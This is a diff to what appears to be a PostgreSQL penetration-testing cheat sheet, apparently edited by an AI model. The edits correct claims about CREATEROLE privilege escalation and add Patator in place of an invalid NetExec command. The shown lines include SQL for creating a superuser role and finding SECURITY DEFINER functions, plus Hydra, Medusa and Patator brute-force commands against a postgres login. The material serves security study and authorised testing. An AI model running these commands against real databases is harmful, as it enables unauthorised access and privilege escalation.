@@ -180,16 +180,19 @@ SELECT * FROM filecontent;
 SELECT current_setting('is_superuser');
 SHOW search_path;
 
--- If you have CREATEROLE — create a superuser
+-- Create a superuser (only works if YOU are already a superuser)
 CREATE ROLE hacker SUPERUSER LOGIN PASSWORD 'hacker';
 
--- If you have a function with SECURITY DEFINER owned by superuser
--- Look for vulnerable functions
+-- SECURITY DEFINER function owned by a superuser = the real non-superuser escalation path.
+-- Find one whose body you can influence, then call it to run as its owner:
 SELECT proname, prosecdef, proowner::regrole
   FROM pg_proc WHERE prosecdef = true;
 
--- Grant superuser to self (if you can create roles)
-ALTER USER current_user WITH SUPERUSER;
+-- NOTE: the CREATEROLE attribute alone does NOT let you make superusers — PostgreSQL
+-- refuses SUPERUSER/REPLICATION/BYPASSRLS grants unless you already hold them.
+-- CREATEROLE's real leverage: on PG < 16 you can ALTER other non-superuser roles you
+-- created (reset their password, then log in as them) — lateral, not vertical.
+ALTER USER current_user WITH SUPERUSER;   -- silently ignored / errors unless already superuser
 ```
 
 ---
@@ -240,9 +243,11 @@ hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgres://192.168.1.10
 # Medusa
 medusa -h 192.168.1.10 -u postgres -P /usr/share/wordlists/rockyou.txt -M postgres
 
-# NetExec
-netexec ssh 192.168.1.10 -u postgres -P /usr/share/wordlists/rockyou.txt
+# Patator (dedicated postgres_login module)
+patator postgres_login host=192.168.1.10 user=postgres password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='authentication failed'
 ```
+
+> [!warning] **NetExec has no PostgreSQL protocol** — its modules are smb/winrm/ssh/ldap/ftp/rdp/wmi/mssql/vnc/nfs only. Use Hydra/Medusa/Patator for port 5432; `nxc mssql` is the DB-protocol analog but is MSSQL-only.
 
 ---
 
@@ -260,5 +265,5 @@ netexec ssh 192.168.1.10 -u postgres -P /usr/share/wordlists/rockyou.txt
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-01*
-*Model: claude-opus-5*
+*Updated: 2026-09-29*
+*Model: claude-opus-4-8*
